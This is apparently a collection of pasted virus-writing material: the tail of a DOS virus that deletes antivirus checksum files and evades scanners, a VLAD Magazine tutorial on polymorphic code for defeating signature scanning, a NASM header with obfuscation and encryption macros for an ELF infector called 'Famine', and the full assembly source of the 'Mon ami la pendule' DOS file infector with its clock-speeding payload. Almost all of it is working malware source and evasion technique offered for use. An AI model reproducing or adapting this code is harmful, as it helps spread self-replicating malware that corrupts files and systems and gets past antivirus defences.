	mov     bl,es:[di]      ;Get address of System File Table Entry.
	mov     ax,1216h
	int     2fh

	pop     bx

	ret

Get_SFT EndP

Del_CRC_Files   Proc    Near
;Deletes AV CRC checking files.  Much smaller than the previous version.
	
	std                             ;Scan backwards.

find_slash2:                            ;Find the backslash in the path.

	lodsb
	cmp     al,'\'
	jne     find_slash2

	cld                             ;Scan forwards.
	
	lodsw                           ;ADD SI,2 - AX is destroyed.

	push    si
	pop     di                      ;DI=SI=Place to put filename.

	mov     si,offset crc_files

del_crc:

	push    di                      ;Save DI.

loadname:
	movsb
	cmp     byte ptr [di-1],0
	jne     loadname
	
	mov     ah,41h
	call    int21h                  ;Delete.

	pop     di

	cmp     si,offset chk4scan
	jb      del_crc

	ret

Del_CRC_Files   EndP
	

	;Delete these...
CRC_Files       db      'ANTI-VIR.DAT',0
		db      'MSAV.CHK',0
		db      'CHKLIST.CPS',0
		db      'CHKLIST.MS',0

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Chk4Scan        Proc    Near
;This routine searches for SCAN, TB* and F-PR* and exits with the carry
;set if they are found.  All these files self-check themselves so will alert
;the user to the viruses presence.  DV.EXE is checked by DV.COM and won't
;execute.
;Assumes DI=offset length, SI=End of filename

	std                             ;Scan backwards.

find_slash:                             ;Find the backslash in the path.
	lodsb
	cmp     al,'\'
	jne     find_slash
	
	cld                             ;Scan forwards.
	
	lodsw                           ;SI points to byte before slash
					;so we add 2.  AX is killed.
	lodsw
	cmp     ax,'CS'                 ;The 'SC' from SCAN.
	jne     tbcheck
	lodsw
	cmp     ax,'NA'                 ;The 'AN' from SCAN
	jne     chkfail
	stc                             ;Set carry.
	ret
tbcheck:
	cmp     ax,'BT'                 ;The 'TB' from TBSAN.
	jne     fcheck
	stc                             ;Set carry.
	ret
fcheck:
	cmp     ax,'-F'                 ;The 'F-' from F-PROT.
	jne     dvcheck
	lodsw
	cmp     ax,'RP'                 ;The 'PR' from F-PROT.
	jne     chkfail
	stc                             ;Set carry
	ret
dvcheck:
	cmp     ax,'VD'                 ;The 'DV' from DV.EXE.
	jne     chkfail
	lodsw
	cmp     ax,'E.'                 ;The '.E' from DV.EXE.
	jne     chkfail
	stc
	ret
chkfail:
	clc                             ;Clear the carry.
	ret

Chk4Scan        EndP

	com_exe db      0                       ;1=EXE

	New3    db      0e9h                    ;The jump for the start of
	Newoff  dw      0                       ;COM files.

	old3    db      0cdh,20h,90h            ;First 3 comfile bytes here.

	orig_ss dw      0
	orig_sp dw      0

enc_end:


encrypt proc    near            ;Encrypts the virus.
	
	;SI = offset of bit to be encrypted
	;AL = encryptor
poly5:        
	mov     cx,offset enc_end - offset enc_start
	push    cs
	pop     ds
enc_loop:

poly1:                                  ;The next four lines of code are
	ror     al,1                    ;continuously swapped and moved with
poly2:                                  ;other code.  Ever changing...
	ror     al,1
poly3:
	ror     al,1
poly4:
	xor     byte ptr [si],al
poly7:
	nop
	inc     si
	loop    enc_loop
poly8:
	nop
	ret

encrypt endp


length  db      100 dup (0)
stack_end:"
MebmeKuq,VLAD Magazine - Issue #1 - ARTICLE.2_5 - Polymorphism,FlyFar,Email,Thursday 29th of June 2023 09:59:16 PM CDT,"   Polymorphism is where the virus actually modifies its code so that each
subsequent generation of the virus is functionally the same but physically
different.  This works by replacing instructions with instructions that are
different but do the same thing.  For example:

     XOR     BP,BP                   ;db 31h, 0edh
     SUB     BP,BP                   ;db 29h, 0edh

Both of these do exactly the same thing - zero BP.  But the actual bytes
are different!  Thus if these bytes are replaced with each other at random
it makes signature scanning impossible.  This is very useful if used on the
stub (the code before the decryption) as this is the only non-variable
place in the virus.  The overhead isn't much. Algorithmic scanning is the
only solution for AV companies, but this is a lot harder to do and makes
them work for their money.  All scanners have their own inbuilt MTE, SMEG
, and NED detectors but they are special additions.

   Polymorphism is normally added by keeping a database of instructions
and selecting from these at random.  The randomizer is almost always
related to the timer.  There are two ways:

     ;8 bit random number
     IN      AL,40H                  ;Puts a random value in AL.
                                     ;40h is the timer port.

     ;16 bit random number
     IN      AX,40H                  ;Puts a random value in AX.

     ;Another random number
     XOR     AH,AH                   ;Puts a random value in DX.
     INT     1AH                     ;1ah function 0 read system timer.
                                     ;This is basically the same as the
                                     ;previous examples.

Then you can XOR the number or AND it to add more randomness.

   The database is whatever you need, but for ease of programming a
power of two is best (2,4,8,16) with two-byte instructions.  Then you can
get your random number and AND off the bits you don't need.  If you had
four random instructions to choose from you'd:

     AND     AX,3                    ;3 = 00000011b

Which would leave it with only 4 possibilities.

The offset of your database is moved into a register and the random number
multiplied by two would be added to it (because the instructions are two
bytes long).  Now you have your random instruction.  All you do is simply
move it where it is needed and you're done!

Here is all that added together into some simple polymorphisms:

     IN      AX,40H                  ;Random number in AX.
     AND     AX,3                    ;Between 0-3.
     SHL     AX,1                    ;Multiply by two because instructions
                                     ;are two bytes long.

     MOV     SI,OFFSET DATABASE      ;SI points to start of database.
     ADD     SI,AX                   ;Add SI with AX the random offset.
     MOV     DI,OFFSET POLY1         ;Put the random instruction here.
     MOVSW                           ;Move the instruction.
     RET                             ;Finished.

     ;Garbage 'do nothing' instructions.
DATABASE     DB      2CH,0           ; = sub al,0
             DB      89H,0C0H        ; = mov ax,ax
             DB      88H,0C9H        ; = mov cl,cl
             DB      21H,0D2H        ; = and dx,dx

This is only simple stuff but that's why it's called a beginners lesson! As
you can see it doesn't take up too much code at all.  MTE and NED are much
better but they take up 1000+ bytes!  That's overdoing it!

   Other places of use are in the encryptor.  Random garbler bytes can add
thousands more variations to your virus than the normal 255.  Randomize
the actual number of variable bytes put in and you can have a variable
length encryptor.  The actual polymorphic routine should be kept inside the
encryption and called before the virus is written to file.

   A few things to be aware of are that your databases must contain
instructions of the same length.  You can have databases with three-byte
instructions but you can't mix the lengths.  Go through DEBUG and enter
the code to grab the bytes.

   That was a short walkthrough of a fairly simple concept.  I know there
aren't any polymorphic viruses included with this magazine but be assured
there will be next time!  I hope someone has learned something from this.
"
K3cTXHqs,header.s,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:47:03 PM CDT,"; ELF header data for comparisons

%define	_SYSV_			0x00010102464c457f
%define	_GNU_			0x03010102464c457f
%define	_DYN_			0x00000001003e0003
%define	_EXEC_			0x00000001003e0002
%define	SEGMENT_TYPE	0x0000000000000004
%define PF_R			0x4
%define	PF_X			0x1
%define PF_W			0x2

%define	_pwrite			18
%define _read			0x0
%define	_exit			60
%define	_open			2
%define	_close			3
%define	_fstat			5
%define	_mmap			9
%define	_munmap			11
%define	_getdents		78
%define	_chmod			90
%define _lseek			8
%define _sync			162
%define _fork			0x39

; File acces
%define	O_RDONLY			0o0000000
%define	O_RDWR				0o0000002
%define	O_DIRECTORY			0o0200000
%define	PATH_MAX			4096
%define	DT_REG				8
%define DT_DIR				4
%define END_SEEK			2
; mmap
%define	PROT_READ			0x1
%define	PROT_WRITE			0x2
%define	MAP_SHARED 			0x01
%define	MMAP_ERRORS			-4095

; Famine
%define FAMINE_SIZE			(_end - _start)
%define KEY_SIZE			5
%define STACK(x)			[(rbp - famine_size) + x]
%define	DIRENT_ARR_SIZE		1024
%define JMP					0xe9
%define EHDR_SIZE			64
%define PHDR_SIZE			56

%define JUMP_DECYPHER_OFFSET _start.OUI - _start +1
%define KEY_OFFSET			_start.key_offset - _start + 1
%define FACTOR_OFFSET		_start.factor_offset - _start + 2 

%define RETURN_JUMP_OFFSET	_end - _exx
%define RETURN_JUMP_VALUE_OFFSET _end - _exx - + 5

%define SIGNATURE_OFFSET	signature - _start + 44
%define BEGIN_SIGNATURE_OFFSET_FORM_END _end - signature - 1

%define POLY_OFFSET_1	_start.label_poly1 - _start
%define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start

%macro OBF_POLY_1 0
	OBF_PUSH_RAX
	OBF_PUSH_RDI
	call .pop9
	.pop9:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x90909090
	pop rdi
	.label_poly1:
	dd 0xAAAAAAAA
	mov rbx, 0x00000000
	mov dword[rax+12], ebx
	pop rax
%endmacro


%macro POLY_CRAP_SKIPPED 0
	.poly_crap_skipped:
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
	dd 0xAAAAAAAA
%endmacro
; MACROS

%macro OBF_GENERIC 0
jmp short 0x2
db 0x0F
%endmacro

%macro OBF_GENERIC1 0
jmp short 0x2
db 0xDE
%endmacro

%macro OBF_GENERIC2 0
jmp short 0x2
db 0xF3
%endmacro

%macro OBF_PUSH_RAX 0
	jmp short 5
	push 0x500fDD90
%endmacro


%macro OBF_PUSH_RBX 0
	jmp short 5
	push 0x53909090
%endmacro

%macro OBF_PUSH_RCX 0
	jmp short 5
	push 0x5146EEF0
%endmacro

%macro OBF_PUSH_RDX 0
	jmp short 6
	db 0xF8
	push 0x5246EEF0
%endmacro

%macro OBF_PUSH_RSI 0
	jmp short 5
	db 0xF8
	dd 0x5646EEF0
%endmacro

%macro OBF_PUSH_RDI 0
	jmp short 5
	db 0x03
	dd 0x5702EEc0
%endmacro

%macro OBF_PUSH_RBP 0
	jmp short 5
	db 0x03
	dd 0x55380F66
%endmacro

%macro OBF_PUSH_RSP 0
	jmp short 5
	db 0x03
	dd 0x543A0F66
%endmacro

%macro OBF_PUSH_R8 0
	jmp short 4
	db 0x02
	dd 0x5041A0F6
%endmacro

%macro OBF_PUSH_R9 0
	jmp short 4
	db 0x02
	dd 0x5141C3EB
%endmacro

%macro OBF_PUSH_R10 0
	jmp short 4
	db 0x02
	dd 0x5241C3D0
%endmacro

%macro OBF_OVERWRITE_PUSHR8R9 0
	OBF_PUSH_R8
	call .pop
	.pop:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x51415041
	pop r8
	dd 0xADE1F1FF
	mov dword[rax+15], 0x0FDE21C3
%endmacro

%macro OBF_OVERWRITE_PUSHR10R11 0
	OBF_PUSH_R8
	call .pop1
	.pop1:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x53415241
	pop r8
	dd 0xFFADE1F1
	mov dword[rax+15], 0xAE0F1233
%endmacro

%macro OBF_OVERWRITE_PUSHR12R13 0
	OBF_PUSH_RDI
	call .pop2
	.pop2:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x55415441
	pop rdi
	dd 0xEEA0FDF1
	mov dword[rax+12], 0xCC010203
%endmacro

%macro OBF_OVERWRITE_PUSHR14R15 0
	OBF_PUSH_RDI
	call .pop3
	.pop3:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x57415641
	pop rdi
	dd 0xEEA0C3F1
	mov dword[rax+12], 0x09e97171
%endmacro

%macro OBF_OVERWRITE_POPR9R8 0
	OBF_PUSH_R8
	call .pop4
	.pop4:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x58415941
	pop r8
	dd 0xADE1F1FF
	mov dword[rax+15], 0xCDCE1212
%endmacro

%macro OBF_OVERWRITE_POPR11R10 0
	OBF_PUSH_R8
	call .pop5
	.pop5:
	pop r8
	mov rax, r8
	mov dword[r8+15], 0x5A415B41
	pop r8
	dd 0xFFADE1F1
	mov dword[rax+15], 0x66AEF700
%endmacro

%macro OBF_OVERWRITE_POPR13R12 0
	OBF_PUSH_RDI
	call .pop6
	.pop6:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x5C415D41
	pop rdi
	dd 0xEEA0FDF1
	mov dword[rax+12], 0xBBDFDEAD
%endmacro

%macro OBF_OVERWRITE_POPR15R14 0
	OBF_PUSH_RDI
	call .pop7
	.pop7:
	pop rdi
	mov rax, rdi
	mov dword[rdi+12], 0x5E415F41
	pop rdi
	dd 0xEEA0C3F1
	mov dword[rax+12], 0x12131441
%endmacro



%macro OBF_POP_RAX 0
	jmp short 5
	push 0x580fDD90
%endmacro


%macro OBF_POP_RBX 0
	jmp short 5
	push 0x5B909090
%endmacro

%macro OBF_POP_RCX 0
	jmp short 5
	push 0x5941442F
%endmacro

%macro OBF_POP_RDX 0
	jmp short 6
	db 0xF8
	push 0x5A26EDA0
%endmacro

%macro OBF_POP_RSI 0
	jmp short 5
	db 0xF8
	dd 0x5E666EFC
%endmacro

%macro OBF_POP_RDI 0
	jmp short 5
	db 0x0f
	dd 0x5FE4E4c3
%endmacro

%macro OBF_POP_RBP 0
	jmp short 5
	db 0x03
	dd 0x5DCCEFFF
%endmacro

%macro OBF_POP_RSP 0
	jmp short 5
	db 0x03
	dd 0x5C3AEF6C
%endmacro

%macro OBF_POP_R8 0
	jmp short 4
	db 0x02
	dd 0x5841A0F6
%endmacro

%macro OBF_POP_R9 0
	jmp short 4
	db 0x02
	dd 0x5941C3EB
%endmacro

%macro OBF_POP_R10 0
	jmp short 4
	db 0x02
	dd 0x5A41C3D0
%endmacro

%macro PUSH 0
	OBF_PUSH_RAX
	OBF_PUSH_RBX
	OBF_PUSH_RCX
	OBF_PUSH_RDX
	OBF_GENERIC
	OBF_PUSH_RSI
	OBF_PUSH_RDI
	OBF_PUSH_RBP
	OBF_PUSH_RSP
	OBF_OVERWRITE_PUSHR8R9
	OBF_OVERWRITE_PUSHR10R11
	OBF_OVERWRITE_PUSHR12R13
	OBF_OVERWRITE_PUSHR14R15
%endmacro

%macro POP 0
	OBF_OVERWRITE_POPR15R14
	OBF_OVERWRITE_POPR13R12
	OBF_OVERWRITE_POPR11R10
	OBF_OVERWRITE_POPR9R8
	OBF_POP_RSP
	OBF_POP_RBP
	OBF_POP_RDI
	OBF_POP_RSI
	OBF_GENERIC
	OBF_POP_RDX
	OBF_POP_RCX
	OBF_POP_RBX
	OBF_POP_RAX
%endmacro



%macro CYPHER 0
	OBF_GENERIC
	xor r11, r11
	mov rdi, STACK(famine.key)  ; key
	OBF_GENERIC2
	mov rax, _start.enc_start
	lea rdx, STACK(famine.tocypher + _start.enc_start - _start)
	mov rcx, enc_end
	sub rcx, rax
	mov r12, STACK(famine.factor)
	OBF_GENERIC
	.cyphering:
		mov r11b, byte [rdx]
		xor r11, rdi
		mov byte [rdx], r11b
		inc rdx
		dec r12
		add rdi, r12
	loop .cyphering
%endmacro

%macro DECYPHER 0
	xor r11, r11
	.key_offset:
	mov rdi, 0xAA  ; key
	mov rax, .enc_start
	lea rdx, [rel .enc_start]
	mov rcx, enc_end
	sub rcx, rax
	.factor_offset:
	mov r12, 0xAA
	.decyphering:
		mov r11b, byte [rdx]
		xor r11, rdi
		mov byte [rdx], r11b
		inc rdx
		dec r12
		add rdi, r12
		loop .decyphering
%endmacro
;Structures

	struc	dirent
.d_ino:			resq	1	; 64-bit inode number
.d_off:			resq	1	; 64-bit offset to next structure
.d_reclen		resw	1	; Size of this dirent
.d_name			resb	1	; Filename (null-terminated)
.pad			resb	0	;  0 PADDING 
.d_type			resb	1	; byte TYPE
	endstruc



	struc	stat
.st_dev			resq	1	; ID of device containing file
.__pad1			resw	1	; Padding
.st_ino			resq	1	; Inode number
.st_mode		resd	1	; File type and mode
.st_nlink		resq	1	; Number of hard links
.st_uid			resd	1	; User ID of owner
.st_gid			resd	1	; Group ID of owner
.st_rdev		resq	1	; Device ID (if special file)
.__pad2			resw	1	; Padding
.st_size		resq	1	; Total size, in bytes
.st_blksize		resq	1	; Block size for filesystem I/O
.st_blocks		resq	1	; Number of 512B blocks allocated
.st_atim		resq	2	; Time of last access
.st_mtim		resq	2	; Time of last modification
.st_ctim		resq	2	; Time of last status change
.__unused		resq	3	; Unused
	endstruc



; ELF headers

	struc	elf64_ehdr
.e_ident		resb	16	; Magic number and other info
.e_type			resw	1	; Object file type
.e_machine		resw	1	; Architecture
.e_version		resd	1	; Object file version
.e_entry		resq	1	; Entry point virtual address
.e_phoff		resq	1	; Program header table file offset
.e_shoff		resq	1	; Section header table file offset
.e_flags		resd	1	; Processor-specific flags
.e_ehsize		resw	1	; ELF header size in bytes
.e_phentsize	resw	1	; Program header table entry size
.e_phnum		resw	1	; Program header table entry count
.e_shentsize	resw	1	; Section header table entry size
.e_shnum		resw	1	; Section header table entry count
.e_shstrndx		resw	1	; Section header string table index
	endstruc



	struc	elf64_phdr
.p_type			resd	1	; Segment type
.p_flags		resd	1	; Segment flags
.p_offset		resq	1	; Segment file offset
.p_vaddr		resq	1	; Segment virtual address
.p_paddr		resq	1	; Segment physical address
.p_filesz		resq	1	; Segment size in file
.p_memsz		resq	1	; Segment size in memory
.p_align		resq	1	; Segment alignment
	endstruc

; Structure for our variables on stack

	struc	famine
.dirents		resb	DIRENT_ARR_SIZE	; Array of dirents
.dir_fd			resq	1				; Directory fd
.file_path		resb	PATH_MAX		; File path Buffer
.new_dir		resb	PATH_MAX
.file_fd		resq	1				; Open file fd
.stat			resb	stat_size		; Buffer for stat struct
.file_size		resq	1				; Size of open file
.jmp			resb	5				; jmp :  e9 xx xx xx xx 
.file_data		resq	1				; Pointer to mmapped file data
.status_str		resb	110				; buf for /proc/self/status
.tocypher		resb	0x5000			; location to cyphered v
.key			resb	1				; location to key
.factor			resb	1				; factor to derivate key
.morph_sign_u	resb	1				; factor to add to signature
.morph_sign_d	resb	1				; factor to add to ssignature  tenth
.tmp_rand		resw	1				;
.commpath		resb	100				; path to commfiles
.dirents_proc	resb	DIRENT_ARR_SIZE	; Array of dirents for /proc
endstruc"
fhfQYVqN,VLAD Magazine - Issue #3 - ARTICLE.4._7 - Mon ami la pendule,FlyFar,ASM (NASM),Thursday 29th of June 2023 09:31:25 PM CDT,"; [Mon ami la pendule]
; ""My friend the clock""
;
; by Metabolis/VLAD
; and Black Avenger of Moscow
;
; Basically I needed a shell to contain the payload I'd 
; written for one of my own viruses but I kinda stuffed
; up slightly and wanted to release this before vlad#3.
; As a favour to me Black Avenger gave me his first virus
; to use with my payload.  He asked only to be given
; credit in the asm source itself, so I've just stuck
; my handle down there in the code  (can't let a virus
; have no one responsible for it now can I? :)
;
; compile with:
; tasm /m2 monami.asm
; tlink monami.obj
; exe2bin monami.exe monami.com
;
; hooks int 21
; infects on - execution
;            + open
;            + extended open
; will infect files in the PATH environment variable

        .MODEL TINY
        .CODE
        .RADIX 16

START:
        pushf
        cli
        call    DELTA
DELTA:
        pop     si
        sub     si,DELTA-START
        push    cs
        push    si
        push    ax
        mov     bx,-1
        mov     ah,4A
        int     21
        sub     bx,(MEM-START+0f)/10
        push    bx
        push    es
        mov     bp,ds
        add     bx,bp
        mov     es,bx
        sub     di,di
        mov     cx,TOP-START
        push    cx
        push    si
        push    cs
        cld
        rep     movs byte ptr [di],cs:[si]
        push    es
        mov     cl,offset RESTART
        push    cx
        retf
RESTART:
        pop     es
        pop     di
        pop     cx
PGM_SEG:
        lea     ax,[bp-100]
        mov     ds,ax
PGM_OFF:
        mov     si,RTRN-START+1100
        rep     movsb
        mov     ah,2C
        int     21
        call    CHECKSUM
        mov     ax,3521
        int     21
        push    cs
        pop     ds
        mov     si,offset REAL_INT21
        mov     [si+CHAINDOS+1-REAL_INT21],bx
        mov     [si+CHAINDOS+3-REAL_INT21],es
        pop     es
        pop     bx
        xchg    si,dx
        mov     ah,25
        int     21
        dec     bx
        jz      EXIT
        mov     ah,4A
        int     21
        mov     ax,cs
        dec     ax
        mov     ds,ax
        mov     di,2
        mov     byte ptr [di-1],8
        stosw
CHECKDATE:
        mov     ah,2Ah                          ; get system date
        int     21h

        or      al,al                           ; is today Sunday?
        jne     EXIT                            ; nope, carry on
OVERDRIVE:                                      ; speed up the computer
        mov     ax,34h                          ; clock about 10 TIMEs
        out     43h,ax                          ; port 43h Control Word
                                                ; (write only)
        mov     ax,11h                          ; port 40h Channel 0 counter
        out     40h,ax                          ; (read/write)
        jmp     EXIT

COPYR   db      '[Mon ami la pendule] - Metabolis/VLAD'

EXIT:
        push    es
        pop     ds
        pop     ax
        iret

CHECKSUM:
        mov     si,offset SPREADING_THE_DISEASE
CHECKSUM_LUP:
        lods    word ptr cs:[si]
        add     cx,ax
        xor     dx,cx
        cmp     si,offset GOT_POS
        jb      CHECKSUM_LUP
        ret

ERROR_HANDLER:
        mov     al,3
        iret

REAL_INT21:
        pushf
        cld
        cmp     ax,2521
        jne     TIME
CHKS1:
        cmp     cx,80
        jne     _CHAINDOS
CHKS2:
        cmp     si,80
        jne     _CHAINDOS
        mov     bx,1
        popf
        iret

TIME:
        push    ax
        push    si
        cmp     ah,2C
        jne     SPREAD
        call    DOS
        push    cx
        push    dx
        call    CHECKSUM
        mov     word ptr cs:[CHKS1+2],cx
        mov     word ptr cs:[CHKS2+2],dx
        pop     dx
        pop     cx
        pop     si
        pop     ax
        popf
        iret
SPREAD:
        push    cx
        push    dx
        push    bx
        push    bp
        push    di
        push    es
        push    ds
        cmp     ax,4B00
        je      SPREADING_THE_DISEASE
        cmp     ah,3Dh
        je      SPREADING_THE_DISEASE
        cmp     ax,6C00
        jne     GET_OUT
        and     dx,3
        dec     dx
        mov     dx,si
        jz      SPREADING_THE_DISEASE
GET_OUT:
        pop     ds
        pop     es
        pop     di
        pop     bp
        pop     bx
        pop     dx
        pop     cx
        pop     si
        pop     ax
_CHAINDOS:
        popf
CHAINDOS:
        db      0EA
        dd      ?

SPREADING_THE_DISEASE:
        xchg    bp,ax
        sub     bx,bx        
        mov     es,bx
        mov     bl,90
        mov     ax,cs
        xchg    ax,es:[bx+2]
        push    ax
        mov     ax,offset ERROR_HANDLER
        xchg    ax,es:[bx]
        push    ax
        push    bx
        push    es
        mov     ah,2F
        call    DOS
        push    bx
        push    es
        push    dx
        push    ds
        push    cs
        pop     ds
        mov     dx,offset DTA
        mov     ah,1A
        call    DOS
        pop     ds
        pop     dx
        mov     ah,4E
        call    FIND
SPREAD_LUP:
        mov     si,offset BUF
        push    bp
        push    dx
        push    ds
        mov     ax,4301
        push    ax
        jc      _ATTR
        cmp     word ptr cs:[si+1C-44],10
        jnb     __ATTR
        mov     bl,cs:[si+19-44]
        shr     bl,1
        cmp     bl,20
        jnb     __ATTR
        mov     cx,1F04
        and     cx,cs:[si+15-44]
        test    cl,cl
        jnz     __ATTR
        cmp     bl,ch
        je      __ATTR
        call    SET_ATTR
        jc      _ATTR
        mov     ax,3D02
        call    DOS
        jnc     OPEN
__ATTR:
        cmc
_ATTR:
        jmp     ATTR
OPEN:
        push    cs
        pop     ds
        xchg    bx,ax
        mov     cl,40
        mov     ah,3F
        call    BUF_IO
        jc      CLOSE_CY
        cmp     word ptr [si],'ZM'
        je      GOT_EXE
        cmp     word ptr [si],'MZ'
        je      GOT_EXE
        push    cs
        pop     es
        mov     di,offset DTA+1E
        mov     cl,0E
        repne   scasb
        mov     ax,[di-4]
        cmp     ax,'XE'
        je      CHECK_EXT
        cmp     ax,'OC'
        jne     _CLOSE_NZ
        mov     al,'M'
CHECK_EXT:
        cbw
        sub     al,[di-2]
        jnz     _CLOSE_NZ
GOT_COM:
        mov     word ptr [ADJ_HEAD+1],ax
        cwd
        cmp     byte ptr [si],0E8
        je      DISP_3
        cmp     byte ptr [si],0E9
        jne     _GOT_POS
DISP_3:
        mov     al,3
        add     ax,[si+1]
_GOT_POS:
        jmp     GOT_POS
GOT_EXE:
        inc     word ptr [si+0C]
_CLOSE_NZ:
        jnz     CLOSE_NZ
        mov     di,[si+14]
        cmp     di,START-TOP-10
        ja      CLOSE_NZ
        cmp     cx,[si+18]
        jne     SKIP_PM
        les     dx,[si+3C]
        call    SEEKES
        call    IN4
        jc      SKIP_PM
        cmp     word ptr [si+1A],'EN'
        je      _CLOSE
SKIP_PM:
        mov     ax,[si+16]
        call    I_MUL
        sub     cx,cx
        add     ax,di
        adc     dx,cx
        call    CHECK_STACK
CLOSE_CY:
        jc      _CLOSE
        push    ax
        push    dx
        add     ax,TOP-START
        adc     dx,cx
        sub     ax,[si+1A-44]
        sbb     dx,[si+1C-44]
        cmc
        jc      bad_entry
        les     ax,[si+1A-44]
        mov     dx,es
        call    CHECK_STACK
bad_entry:
        pop     di
        pop     bp
        jc      _CLOSE
        push    ax
        push    dx
        mov     ch,2  
        div     cx
        test    dx,dx
        jz      SKIP_INC
        inc     ax
SKIP_INC:
        cmp     ax,[si+4]
        pop     dx
        pop     ax
CLOSE_NZ:
        jne     _CLOSE
        add     ax,TOP-START
        adc     dx,0 
        div     cx
        test    dx,dx
        jz      SKIP_INC1
        inc     ax
SKIP_INC1:
        mov     [si+4],ax
        mov     [si+2],dx
        call    SEEK_RELOCTBL
        inc     word ptr [si+6]
RELOC_LUP:
        dec     word ptr [si+6]
        jz      RELOC_END
        call    IN4
        mov     ax,[si+1C]
        call    I_MUL
        add     ax,[si+1A]
        adc     dx,0
        sub     ax,bp
        sbb     dx,di
        jnc     CHECK
        inc     ax
        jnz     RELOC_LUP
        inc     dx
RELOC_NXT:
        jnz     RELOC_LUP
_CLOSE:
        jmp     __CLOSE
CHECK:
        jnz     RELOC_LUP
        cmp     ax,TOP-START
        jnb     RELOC_NXT
        add     ax,[si+1A-44]
        adc     dx,[si+1C-44]
        mov     cl,10
        div     cx
        sub     ax,[si+8]
        mov     word ptr [si+1A],dx
        mov     word ptr [si+1C],ax
        mov     dx,-4
        mov     cx,-1
        mov     ax,4201
        call    DOS
        mov     ah,40
        call    OUT4
        jnc     RELOC_LUP
__CLOSE:
        jmp     CLOSE
RELOC_END:
        mov     ax,[si+8]
        mov     word ptr [ADJ_HEAD+1],ax
        sub     dx,dx
        call    SEEKCX
        mov     cl,6
        mov     ah,40
        call    BUF_IO
        jc      CLOSE
        xchg    bp,ax
        xchg    di,dx
GOT_POS:
        xchg    dx,ax
        xchg    cx,ax
        push    cx
        push    dx
        call    seek
        mov     ah,3F
        call    BUF_IOCX
        jc      CLOSE_POS
        les     dx,[si+1A-44]
        call    SEEKES
        mov     cl,10
        div     cx
        add     ax,cx
ADJ_HEAD:
        sub     ax,0
        mov     word ptr [PGM_SEG+2],ax
        mov     word ptr [PGM_OFF+1],dx
        mov     ah,40
        call    BUF_IOCX
CLOSE_POS:
        pop     dx
        pop     cx
        jc      CLOSE
        call    seek
        mov     cx,TOP-START
        mov     ah,40
        cwd
        call    IO
        jc      CLOSE
        les     cx,[si+16-44]
        mov     dx,es
        and     cx,-20
        mov     ax,dx
        shr     ah,1
        or      cl,ah
        mov     ax,5701
        or      byte ptr [GOT_ONE],al
        call    DOS
CLOSE:
        mov     ah,3E
        call    DOS
        clc
ATTR:
        pop     ax
        pop     ds
        pop     dx
        jc      SKIP_ATTR
        mov     cl,cs:[si+15-44]
        call    SET_ATTR
SKIP_ATTR:
        pop     ax
        cmp     ah,4Bh
        je      SPREAD_CONT
FIX_PTRS:
        pop     ds
        pop     dx
        mov     ah,1A
        call    DOS
        pop     es
        pop     di
        pop     ax
        stosw
        pop     ax
        stosw
        jmp     GET_OUT
SPREAD_CONT:
        push    cs
        pop     es
        mov     dx,offset NAM
        shr     al,1
        inc     ax
        xchg    bp,ax
        mov     ah,4F
        jc      GOT_ONE
        sub     bx,bx
        mov     ah,62
        call    DOS
        test    bx,bx
        jz      FIX_PTRS
        mov     ds,bx
        sub     si,si
        cmp     si,[si+2C]
        jz      FIX_PTRS
        mov     ds,[si+2C]
SCAN_ENV:
        lodsb
        test    al,al
        jnz     SCAN_ENV
        lodsb
        test    al,al
        jz      FIX_PTRS
        or      al,20
        cmp     al,'p'
        jne     SCAN_ENV
        lodsw
        or      ax,2020
        cmp     ax,'ta'
        jne     SCAN_NXT
        lodsw
        or      al,20
        cmp     ax,'=h'
        je      SCAN_PATH
SCAN_NXT:
        dec     si
        dec     si
        jmp     SCAN_ENV
NEXT_DIR:
        pop     ds
        pop     si
        pop     ax
        test    al,al
        jz      FIX_PTRS
SCAN_PATH:
        and     byte ptr cs:[GOT_ONE],0FE
        mov     di,dx
COPY_PATH:
        lodsb
        cmp     al,';'
        je      END_DIR
        test    al,al
        jz      END_DIR
        stosb
        jmp     COPY_PATH
END_DIR:
        push    ax
        push    si
        push    ds
        dec     di
        mov     al,'\'
        scasb
        je      SET_MASK
        stosb
SET_MASK:
        push    di
        mov     ax,'.*'
        stosw
        cbw
        stosw
        mov     ah,4E
GOT_ONE:
        clc
        pop     di
        jc      NEXT_DIR
        push    cs
        pop     ds
        call    FIND
        jc      NEXT_DIR
        push    di
        mov     si,offset DTA+1E
        mov     cl,7
        rep     movsw
        jmp     SPREAD_LUP
        
CHECK_STACK:
        xchg    bp,ax
        xchg    di,dx
        mov     ax,[si+0E]
        call    I_MUL
        add     ax,[si+10]
        adc     dx,cx
        sub     ax,bp
        sbb     dx,di
        cmc
        jnc     BELOW_STACK
        sub     ax,TOP-START+64
        sbb     dx,cx
BELOW_STACK:
        xchg    di,dx
        xchg    bp,ax
        ret

I_MUL:
        add     ax,[si+8]
        mov     dx,10
        imul    dx
        ret

IN4:
        mov     ah,3F
OUT4:
        mov     dx,offset BUF+1A
        mov     cx,4
        jmp     IO
BUF_IOCX:
        mov     cx,TOP-START
BUF_IO:
        mov     dx,si
IO:
        call    DOS
        jc      IO_RTRN
        sub     ax,cx
IO_RTRN:
        ret

FIND:
        mov     cl,23
SET_ATTR:
        sub     ch,ch
        jmp     DOS

SEEK_RELOCTBL:
        mov     dx,[si+18]
SEEKCX:
        sub     cx,cx
        test    ax,0
        org     $-2
SEEKES:
        mov     cx,es
seek:
        mov     ax,4200
DOS:
        pushf
        cli
        push    cs
        call    CHAINDOS
RTRN:
        ret

TOP:

NAM     db      60 dup(?)
DTA     db      44 dup(?)
BUF     db      TOP-START dup(?)

MEM:

        end     START"
